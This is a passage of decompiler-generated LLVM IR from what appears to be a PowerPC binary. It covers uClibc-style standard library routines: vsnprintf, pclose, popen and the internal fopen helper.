  %v2_1000b088 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000b088, i32* %stack_var_-96, align 4
  store i32 268480660, i32* @lr, align 4
  %v0_1000b090 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000b090
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000b0b0 = load i32, i32* @r4, align 4
  store i32 %v0_1000b0b0, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000b0cc = load i32, i32* @r3, align 4
  %v1_1000b0cc = sub i32 -1, %v0_1000b0cc
  store i32 %v1_1000b0cc, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000b0cc, i32* %r31.global-to-local, align 4
  %v2_1000b0e0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b0e0, i32* @r3, align 4
  %v0_1000b0e4 = load i32, i32* @r5, align 4
  store i32 %v0_1000b0e4, i32* %r29.global-to-local, align 4
  %v0_1000b0e8 = load i32, i32* @r6, align 4
  store i32 %v0_1000b0e8, i32* @r28, align 4
  store i32 268480760, i32* @lr, align 4
  %v0_1000b0f4 = call i32 @__stdio_init_mutex()
  %v0_1000b0f8 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000b0f8 = load i32, i32* @r27, align 4
  %v3_1000b0f8 = icmp ugt i32 %v0_1000b0f8, %v1_1000b0f8
  %v0_1000b0fc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000b0fc, i32* @r4, align 4
  %v0_1000b100 = load i32, i32* @r28, align 4
  store i32 %v0_1000b100, i32* @r5, align 4
  %v2_1000b104 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000b104, i32* @r3, align 4
  br i1 %v3_1000b0f8, label %dec_label_pc_1000b110, label %dec_label_pc_1000b114

dec_label_pc_1000b110:                            ; preds = %entry
  store i32 %v1_1000b0f8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000b114

dec_label_pc_1000b114:                            ; preds = %entry, %dec_label_pc_1000b110
  %v1_1000b114 = phi i32 [ %v0_1000b0f8, %entry ], [ %v1_1000b0f8, %dec_label_pc_1000b110 ]
  %v0_1000b114 = load i32, i32* %r31.global-to-local, align 4
  store i32 268480820, i32* @lr, align 4
  %v0_1000b130 = call i32 @_vfprintf_internal()
  %v0_1000b134 = load i32, i32* @r30, align 4
  %v3_1000b134 = icmp eq i32 %v0_1000b134, 0
  br i1 %v3_1000b134, label %dec_label_pc_1000b15c, label %dec_label_pc_1000b13c

dec_label_pc_1000b13c:                            ; preds = %dec_label_pc_1000b114
  %v4_1000b148 = icmp eq i32 %v1_1000b114, 0
  %v1_1000b144 = sext i1 %v4_1000b148 to i32
  %v0_1000b150.v0_1000b114 = add i32 %v0_1000b114, %v1_1000b144
  %stack_var_-88.0 = inttoptr i32 %v0_1000b150.v0_1000b114 to i8*
  %v0_1000b158 = load i32, i32* @r26, align 4
  %v1_1000b158 = trunc i32 %v0_1000b158 to i8
  store i8 %v1_1000b158, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000b15c

dec_label_pc_1000b15c:                            ; preds = %dec_label_pc_1000b114, %dec_label_pc_1000b13c
  ret i32 %v0_1000b130

; uselistorder directives
  uselistorder i32 %v0_1000b0cc, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_1000b15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b114, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10031644.373 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b194 = ptrtoint i32* %stack_var_-52 to i32
  %v4_1000b19c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_10031644.373 to i32))
  store i32 268480936, i32* @lr, align 4
  %v1_1000b1a4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10031644.373 to i32))
  %v3_1000b1ac = load i32, i32* @global_var_1002f054.374, align 4
  store i32 %v3_1000b1ac, i32* %r29.global-to-local, align 4
  %v3_1000b1b0 = icmp eq i32 %v3_1000b1ac, 0
  br i1 %v3_1000b1b0, label %dec_label_pc_1000b20c, label %dec_label_pc_1000b1b8

dec_label_pc_1000b1b8:                            ; preds = %entry
  %v1_1000b1b8 = add i32 %v3_1000b1ac, 4
  %v2_1000b1b8 = inttoptr i32 %v1_1000b1b8 to i32*
  %v3_1000b1b8 = load i32, i32* %v2_1000b1b8, align 4
  %v1_1000b1bc = load i32, i32* @r31, align 4
  %v4_1000b1bc = icmp eq i32 %v3_1000b1b8, %v1_1000b1bc
  br i1 %v4_1000b1bc, label %dec_label_pc_1000b1c4, label %dec_label_pc_1000b1e8

dec_label_pc_1000b1c4:                            ; preds = %dec_label_pc_1000b1b8
  %v1_1000b1c4 = inttoptr i32 %v3_1000b1ac to i32*
  %v2_1000b1c4 = load i32, i32* %v1_1000b1c4, align 4
  store i32 %v2_1000b1c4, i32* @global_var_1002f054.374, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b1d0:                            ; preds = %dec_label_pc_1000b1e8
  %v0_1000b1d0 = call i32 @__errno_location()
  %v2_1000b1d8 = inttoptr i32 %v0_1000b1d0 to i32*
  store i32 22, i32* %v2_1000b1d8, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b1e0:                            ; preds = %dec_label_pc_1000b234
  %v3_1000b1e0 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_1000b260

dec_label_pc_1000b1e8:                            ; preds = %dec_label_pc_1000b1b8, %dec_label_pc_1000b1f8
  %v1_1000b208 = phi i32 [ %v2_1000b1ec, %dec_label_pc_1000b1f8 ], [ %v3_1000b1ac, %dec_label_pc_1000b1b8 ]
  %v1_1000b1ec = inttoptr i32 %v1_1000b208 to i32*
  %v2_1000b1ec = load i32, i32* %v1_1000b1ec, align 4
  store i32 %v2_1000b1ec, i32* %r29.global-to-local, align 4
  %v3_1000b1f0 = icmp eq i32 %v2_1000b1ec, 0
  br i1 %v3_1000b1f0, label %dec_label_pc_1000b1d0, label %dec_label_pc_1000b1f8

dec_label_pc_1000b1f8:                            ; preds = %dec_label_pc_1000b1e8
  %v1_1000b1f8 = add i32 %v2_1000b1ec, 4
  %v2_1000b1f8 = inttoptr i32 %v1_1000b1f8 to i32*
  %v3_1000b1f8 = load i32, i32* %v2_1000b1f8, align 4
  %v4_1000b1fc = icmp eq i32 %v3_1000b1f8, %v1_1000b1bc
  br i1 %v4_1000b1fc, label %dec_label_pc_1000b204, label %dec_label_pc_1000b1e8

dec_label_pc_1000b204:                            ; preds = %dec_label_pc_1000b1f8
  %v1_1000b204 = inttoptr i32 %v2_1000b1ec to i32*
  %v2_1000b204 = load i32, i32* %v1_1000b204, align 4
  store i32 %v2_1000b204, i32* %v1_1000b1ec, align 4
  br label %dec_label_pc_1000b20c

dec_label_pc_1000b20c:                            ; preds = %entry, %dec_label_pc_1000b1d0, %dec_label_pc_1000b1c4, %dec_label_pc_1000b204
  store i32 %v2_1000b194, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268481048, i32* @lr, align 4
  %v0_1000b214 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000b218 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000b218 = icmp eq i32 %v0_1000b218, 0
  br i1 %v3_1000b218, label %dec_label_pc_1000b260, label %dec_label_pc_1000b220

dec_label_pc_1000b220:                            ; preds = %dec_label_pc_1000b20c
  store i32 %v0_1000b218, i32* @r3, align 4
  %v1_1000b224 = add i32 %v0_1000b218, 8
  %v2_1000b224 = inttoptr i32 %v1_1000b224 to i32*
  %v3_1000b224 = load i32, i32* %v2_1000b224, align 4
  store i32 %v3_1000b224, i32* %r29.global-to-local, align 4
  store i32 268481068, i32* @lr, align 4
  %v0_1000b228 = call i32 @free()
  %v0_1000b22c = load i32, i32* @r31, align 4
  store i32 268481076, i32* @lr, align 4
  %v1_1000b230 = inttoptr i32 %v0_1000b22c to i16*
  %v2_1000b230 = call i32 @__GI_fclose(i16* %v1_1000b230)
  %v2_1000b234 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1000b234

dec_label_pc_1000b234:                            ; preds = %dec_label_pc_1000b24c, %dec_label_pc_1000b220
  %v0_1000b23c = load i32, i32* @r29, align 4
  store i32 268481092, i32* @lr, align 4
  %v3_1000b240 = call i32 @waitpid(i32 %v0_1000b23c, i32 %v2_1000b234, i32 0)
  %tmp8 = icmp sgt i32 %v3_1000b240, -1
  br i1 %tmp8, label %dec_label_pc_1000b1e0, label %dec_label_pc_1000b24c

dec_label_pc_1000b24c:                            ; preds = %dec_label_pc_1000b234
  %v0_1000b24c = call i32 @__errno_location()
  %v1_1000b250 = inttoptr i32 %v0_1000b24c to i32*
  %v2_1000b250 = load i32, i32* %v1_1000b250, align 4
  %v3_1000b254 = icmp eq i32 %v2_1000b250, 4
  br i1 %v3_1000b254, label %dec_label_pc_1000b234, label %dec_label_pc_1000b260

dec_label_pc_1000b260:                            ; preds = %dec_label_pc_1000b24c, %dec_label_pc_1000b20c, %dec_label_pc_1000b1e0
  %storemerge = phi i32 [ %v3_1000b1e0, %dec_label_pc_1000b1e0 ], [ -1, %dec_label_pc_1000b20c ], [ -1, %dec_label_pc_1000b24c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1000b218, { 1, 0, 2 }
  uselistorder i32 %v2_1000b1ec, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000b20c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000b1e8, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1000b288 = load i8, i8* %arg2, align 1
  %v3_1000b290 = icmp eq i8 %v3_1000b288, 119
  br i1 %v3_1000b290, label %dec_label_pc_1000b2c0, label %dec_label_pc_1000b298

dec_label_pc_1000b298:                            ; preds = %entry
  %v3_1000b298 = icmp eq i8 %v3_1000b288, 114
  br i1 %v3_1000b298, label %dec_label_pc_1000b2c8, label %dec_label_pc_1000b2a8

dec_label_pc_1000b2a8:                            ; preds = %dec_label_pc_1000b298
  %v0_1000b2a8 = call i32 @__errno_location()
  %v2_1000b2b8 = inttoptr i32 %v0_1000b2a8 to i32*
  store i32 22, i32* %v2_1000b2b8, align 4
  br label %dec_label_pc_1000b488

dec_label_pc_1000b2c0:                            ; preds = %entry
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000b2c8

dec_label_pc_1000b2c8:                            ; preds = %dec_label_pc_1000b298, %dec_label_pc_1000b2c0
  %v0_1000b390 = phi i32 [ 0, %dec_label_pc_1000b2c0 ], [ 1, %dec_label_pc_1000b298 ]
  store i32 12, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b2d0.377 to i32), i32* @lr, align 4
  %v0_1000b2cc = call i32 @malloc()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b2cc, i32* %r9.global-to-local, align 4
  %v3_1000b2d4 = icmp eq i32 %v0_1000b2cc, 0
  br i1 %v3_1000b2d4, label %dec_label_pc_1000b488, label %dec_label_pc_1000b2e4

dec_label_pc_1000b2e4:                            ; preds = %dec_label_pc_1000b2c8
  %v2_1000b2e4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000b2e4, i32* %r29.global-to-local, align 4
  store i32 268481264, i32* @lr, align 4
  %v2_1000b2ec = call i32 @__GI_pipe(i32 %v2_1000b2e4, i32 %v0_1000b2cc)
  %v3_1000b2f0 = icmp eq i32 %v2_1000b2ec, 0
  br i1 %v3_1000b2f0, label %dec_label_pc_1000b2f8, label %dec_label_pc_1000b478

dec_label_pc_1000b2f8:                            ; preds = %dec_label_pc_1000b2e4
  store i32 %v0_1000b390, i32* %r9.global-to-local, align 4
  %v0_1000b2fc = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_1000b390
  %v1_1000b300 = and i32 %tmp, 4
  %v1_1000b304 = xor i32 %v1_1000b300, 4
  %v0_1000b308 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000b308 = add i32 %v0_1000b308, %v1_1000b304
  %v3_1000b308 = inttoptr i32 %v2_1000b308 to i32*
  %v4_1000b308 = load i32, i32* %v3_1000b308, align 4
  %v2_1000b314 = add i32 %v0_1000b308, %v1_1000b300
  %v3_1000b314 = inttoptr i32 %v2_1000b314 to i32*
  %v4_1000b314 = load i32, i32* %v3_1000b314, align 4
  store i32 268481316, i32* @lr, align 4
  %v4_1000b320 = call i32 @fdopen(i32 %v4_1000b308, i32 %v0_1000b2fc, i32 %v0_1000b390)
  %v3_1000b324 = icmp eq i32 %v4_1000b320, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000b324, label %dec_label_pc_1000b330, label %dec_label_pc_1000b344

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b2f8
  store i32 268481336, i32* @lr, align 4
  %v1_1000b334 = call i32 @__libc_close(i32 %v4_1000b308)
  store i32 ptrtoint (i32* @global_var_1000b340.378 to i32), i32* @lr, align 4
  %v1_1000b33c = call i32 @__libc_close(i32 %v4_1000b314)
  br label %dec_label_pc_1000b478

dec_label_pc_1000b344:                            ; preds = %dec_label_pc_1000b2f8
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10031644.373 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b358 = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000b35c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268468572, i32 ptrtoint (i32* @global_var_10031644.373 to i32))
  store i32 ptrtoint (i32* @global_var_1000b368.380 to i32), i32* @lr, align 4
  %v1_1000b364 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10031644.373 to i32))
  store i32 %v1_1000b364, i32* @r3, align 4
  store i32 268481388, i32* @lr, align 4
  %v1_1000b368 = call i32 @__vfork(i32 %v1_1000b364)
  %v3_1000b36c = icmp eq i32 %v1_1000b368, 0
  %v0_1000b370 = call i32 @__asm_mfcr()
  store i32 %v0_1000b370, i32* %r29.global-to-local, align 4
  br i1 %v3_1000b36c, label %dec_label_pc_1000b378, label %dec_label_pc_1000b3f8

dec_label_pc_1000b378:                            ; preds = %dec_label_pc_1000b344
  store i32 268481408, i32* @lr, align 4
  %v1_1000b37c = call i32 @__libc_close(i32 %v4_1000b308)
  store i32 %v0_1000b390, i32* %r9.global-to-local, align 4
  %v4_1000b388 = icmp eq i32 %v4_1000b314, %v0_1000b390
  br i1 %v4_1000b388, label %dec_label_pc_1000b3a4, label %dec_label_pc_1000b390

dec_label_pc_1000b390:                            ; preds = %dec_label_pc_1000b378
  store i32 268481436, i32* @lr, align 4
  %v2_1000b398 = call i32 @dup2(i32 %v4_1000b314, i32 %v0_1000b390)
  store i32 268481444, i32* @lr, align 4
  %v1_1000b3a0 = call i32 @__libc_close(i32 %v4_1000b314)
  br label %dec_label_pc_1000b3a4

dec_label_pc_1000b3a4:                            ; preds = %dec_label_pc_1000b378, %dec_label_pc_1000b390
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_1002f054.374, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_1000b3c04 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000b3c04, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000b3b0

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b3a4, %dec_label_pc_1000b3b0
  %v0_1000b3b0 = phi i32 [ %storemerge, %dec_label_pc_1000b3b0 ], [ %storemerge1, %dec_label_pc_1000b3a4 ]
  %v1_1000b3b0 = add i32 %v0_1000b3b0, 4
  %v2_1000b3b0 = inttoptr i32 %v1_1000b3b0 to i32*
  %v3_1000b3b0 = load i32, i32* %v2_1000b3b0, align 4
  store i32 %v3_1000b3b0, i32* %r9.global-to-local, align 4
  %v1_1000b3b4 = add i32 %v3_1000b3b0, 4
  %v2_1000b3b4 = inttoptr i32 %v1_1000b3b4 to i32*
  %v3_1000b3b4 = load i32, i32* %v2_1000b3b4, align 4
  store i32 268481468, i32* @lr, align 4
  %v1_1000b3b8 = call i32 @__libc_close(i32 %v3_1000b3b4)
  %v0_1000b3bc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b3bc = inttoptr i32 %v0_1000b3bc to i32*
  %storemerge = load i32, i32* %v1_1000b3bc, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_1000b3c0 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000b3c0, label %dec_label_pc_1000b3c8, label %dec_label_pc_1000b3b0

dec_label_pc_1000b3c8:                            ; preds = %dec_label_pc_1000b3b0, %dec_label_pc_1000b3a4
  %v8_1000b3ec = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10018c6c.381 to i32), i32 ptrtoint ([3 x i8]* @global_var_10018c74.382 to i32), i32 ptrtoint ([3 x i8]* @global_var_10018c78.383 to i32), i32 %arg1, i32 0)
  %v1_1000b3f4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000b3f8

dec_label_pc_1000b3f8:                            ; preds = %dec_label_pc_1000b344, %dec_label_pc_1000b3c8
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000b358, i32* @r3, align 4
  store i32 268481544, i32* @lr, align 4
  %v0_1000b404 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268481552, i32* @lr, align 4
  %v1_1000b40c = call i32 @__libc_close(i32 %v4_1000b314)
  %v0_1000b410 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b410 = call %0 @__asm_mtcrf(i32 128, i32 %v0_1000b410)
  %v2_1000b410 = extractvalue %0 %v1_1000b410, 0
  %v4_1000b410 = extractvalue %0 %v1_1000b410, 2
  %v2_1000b414 = or i1 %v4_1000b410, %v2_1000b410
  br i1 %v2_1000b414, label %dec_label_pc_1000b470, label %dec_label_pc_1000b418

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b3f8
  store i32 %v0_1000b2cc, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10031644.373 to i32), i32* %r29.global-to-local, align 4
  %v0_1000b428 = load i32, i32* @r30, align 4
  %v2_1000b428 = add i32 %v0_1000b2cc, 8
  %v3_1000b428 = inttoptr i32 %v2_1000b428 to i32*
  store i32 %v0_1000b428, i32* %v3_1000b428, align 4
  %v0_1000b42c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v4_1000b320, i32* %r11.global-to-local, align 4
  %v1_1000b434 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b434 = add i32 %v1_1000b434, 4
  %v3_1000b434 = inttoptr i32 %v2_1000b434 to i32*
  store i32 %v4_1000b320, i32* %v3_1000b434, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v4_1000b440 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-64, i32 268468572, i32 %v0_1000b42c)
  %v0_1000b444 = load i32, i32* %r29.global-to-local, align 4
  store i32 268481612, i32* @lr, align 4
  %v1_1000b448 = call i32 @pthread_mutex_lock(i32 %v0_1000b444)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b450 = load i32, i32* @global_var_1002f054.374, align 4
  store i32 %v2_1000b358, i32* @r3, align 4
  store i32 %v0_1000b2cc, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  %v2_1000b460 = inttoptr i32 %v0_1000b2cc to i32*
  store i32 %v3_1000b450, i32* %v2_1000b460, align 4
  %v0_1000b464 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b464, i32* @global_var_1002f054.374, align 4
  store i32 ptrtoint (i32* @global_var_1000b46c.385 to i32), i32* @lr, align 4
  %v0_1000b468 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000b488

dec_label_pc_1000b470:                            ; preds = %dec_label_pc_1000b3f8
  store i32 268481656, i32* @lr, align 4
  %v1_1000b474 = inttoptr i32 %v4_1000b320 to i16*
  %v2_1000b474 = call i32 @__GI_fclose(i16* %v1_1000b474)
  br label %dec_label_pc_1000b478

dec_label_pc_1000b478:                            ; preds = %dec_label_pc_1000b2e4, %dec_label_pc_1000b330, %dec_label_pc_1000b470
  store i32 %v0_1000b2cc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b480.386 to i32), i32* @lr, align 4
  %v0_1000b47c = call i32 @free()
  br label %dec_label_pc_1000b488

dec_label_pc_1000b488:                            ; preds = %dec_label_pc_1000b2c8, %dec_label_pc_1000b418, %dec_label_pc_1000b2a8, %dec_label_pc_1000b478
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000b2c8 ], [ 0, %dec_label_pc_1000b478 ], [ %v4_1000b320, %dec_label_pc_1000b418 ], [ 0, %dec_label_pc_1000b2a8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_1000b320, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_1000b314, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1000b2cc, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_1000b390, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 4, 3, 9, 10, 5, 6, 7, 8 }
  uselistorder i32* @global_var_1002f054.374, { 1, 2, 0, 3, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10031644.373 to i32), { 4, 0, 3, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_1000b488, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b3f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b3a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2c8, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000b4a0 = load i32, i32* @lr, align 4
  store i32 %v0_1000b4a0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1000b4b4 = load i32, i32* @r5, align 4
  store i32 %v0_1000b4b4, i32* @r31, align 4
  %v0_1000b4b8 = load i32, i32* @r6, align 4
  store i32 %v0_1000b4b8, i32* @r29, align 4
  %v3_1000b4bc = load i8, i8* %arg2, align 1
  %v4_1000b4bc = zext i8 %v3_1000b4bc to i32
  store i32 %v4_1000b4bc, i32* %r0.global-to-local, align 4
  %v3_1000b4c0 = icmp eq i8 %v3_1000b4bc, 114
  br i1 %v3_1000b4c0, label %dec_label_pc_1000b50c, label %dec_label_pc_1000b4c8

dec_label_pc_1000b4c8:                            ; preds = %entry
  %v3_1000b4c8 = icmp eq i8 %v3_1000b4bc, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000b4c8, label %dec_label_pc_1000b510, label %dec_label_pc_1000b4d4

dec_label_pc_1000b4d4:                            ; preds = %dec_label_pc_1000b4c8
  %v3_1000b4d4 = icmp eq i8 %v3_1000b4bc, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1000b4d4, label %dec_label_pc_1000b510, label %dec_label_pc_1000b4e0

dec_label_pc_1000b4e0:                            ; preds = %dec_label_pc_1000b5a0, %dec_label_pc_1000b570, %dec_label_pc_1000b4d4
  %v0_1000b4e0 = call i32 @__errno_location()
  %v0_1000b4e4 = load i32, i32* @r31, align 4
  %v3_1000b4e4 = icmp eq i32 %v0_1000b4e4, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b4ec = inttoptr i32 %v0_1000b4e0 to i32*
  store i32 22, i32* %v2_1000b4ec, align 4
  br i1 %v3_1000b4e4, label %dec_label_pc_1000b740, label %dec_label_pc_1000b4f4

dec_label_pc_1000b4f4:                            ; preds = %dec_label_pc_1000b5d4, %dec_label_pc_1000b4e0
  %v0_1000b4f4 = load i32, i32* @r31, align 4
  %v1_1000b4f4 = inttoptr i32 %v0_1000b4f4 to i16*
  %v2_1000b4f4 = load i16, i16* %v1_1000b4f4, align 2
  %v3_1000b4f4 = zext i16 %v2_1000b4f4 to i32
  store i32 %v3_1000b4f4, i32* %r0.global-to-local, align 4
  %v1_1000b4f8 = and i32 %v3_1000b4f4, 8192
  store i32 %v1_1000b4f8, i32* %r9.global-to-local, align 4
  %v3_1000b4f8 = icmp eq i32 %v1_1000b4f8, 0
  store i1 %v3_1000b4f8, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b4f8, label %dec_label_pc_1000b740, label %dec_label_pc_1000b500

dec_label_pc_1000b500:                            ; preds = %dec_label_pc_1000b4f4
  store i32 %v0_1000b4f4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b508.387 to i32), i32* @lr, align 4
  %v0_1000b504 = call i32 @free()
  br label %dec_label_pc_1000b740

dec_label_pc_1000b50c:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b510

dec_label_pc_1000b510:                            ; preds = %dec_label_pc_1000b4d4, %dec_label_pc_1000b4c8, %dec_label_pc_1000b50c
  %v0_1000b530 = phi i32 [ 1089, %dec_label_pc_1000b4d4 ], [ 577, %dec_label_pc_1000b4c8 ], [ 1, %dec_label_pc_1000b50c ]
  %v2_1000b510 = add i32 %tmp, 1
  %v3_1000b510 = inttoptr i32 %v2_1000b510 to i8*
  %v4_1000b510 = load i8, i8* %v3_1000b510, align 1
  %v5_1000b510 = zext i8 %v4_1000b510 to i32
  store i32 %v5_1000b510, i32* %r0.global-to-local, align 4
  %v3_1000b518 = icmp eq i8 %v4_1000b510, 98
  br i1 %v3_1000b518, label %dec_label_pc_1000b524, label %dec_label_pc_1000b520

dec_label_pc_1000b520:                            ; preds = %dec_label_pc_1000b510
  br label %dec_label_pc_1000b524

dec_label_pc_1000b524:                            ; preds = %dec_label_pc_1000b510, %dec_label_pc_1000b520
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000b520 ], [ %v2_1000b510, %dec_label_pc_1000b510 ]
  %v0_1000b524 = phi i32 [ %tmp, %dec_label_pc_1000b520 ], [ %v2_1000b510, %dec_label_pc_1000b510 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000b524 = add i32 %v0_1000b524, 1
  %v2_1000b524 = inttoptr i32 %v1_1000b524 to i8*
  %v3_1000b524 = load i8, i8* %v2_1000b524, align 1
  %v4_1000b524 = zext i8 %v3_1000b524 to i32
  store i32 %v4_1000b524, i32* %r0.global-to-local, align 4
  %v3_1000b528 = icmp eq i8 %v3_1000b524, 43
  br i1 %v3_1000b528, label %dec_label_pc_1000b530, label %dec_label_pc_1000b538

dec_label_pc_1000b530:                            ; preds = %dec_label_pc_1000b524
  store i32 %v0_1000b530, i32* %r9.global-to-local, align 4
  %v1_1000b534 = add nuw nsw i32 %v0_1000b530, 1
  store i32 %v1_1000b534, i32* @r28, align 4
  br label %dec_label_pc_1000b538

dec_label_pc_1000b538:                            ; preds = %dec_label_pc_1000b524, %dec_label_pc_1000b530
  %v3_1000b538 = icmp eq i32 %v0_1000b4b4, 0
  br i1 %v3_1000b538, label %dec_label_pc_1000b540, label %dec_label_pc_1000b568

dec_label_pc_1000b540:                            ; preds = %dec_label_pc_1000b538
  store i32 80, i32* @r3, align 4
  store i32 268481864, i32* @lr, align 4
  %v0_1000b544 = call i32 @malloc()
  store i32 %v0_1000b544, i32* @r31, align 4
  %v4_1000b548 = icmp eq i32 %v0_1000b544, 0
  store i1 %v4_1000b548, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000b548, label %dec_label_pc_1000b744, label %dec_label_pc_1000b550

dec_label_pc_1000b550:                            ; preds = %dec_label_pc_1000b540
  %v1_1000b554 = add i32 %v0_1000b544, 56
  store i32 %v1_1000b554, i32* @r3, align 4
  %v3_1000b558 = inttoptr i32 %v0_1000b544 to i16*
  store i16 8192, i16* %v3_1000b558, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b560 = load i32, i32* @r31, align 4
  %v2_1000b560 = add i32 %v1_1000b560, 8
  %v3_1000b560 = inttoptr i32 %v2_1000b560 to i32*
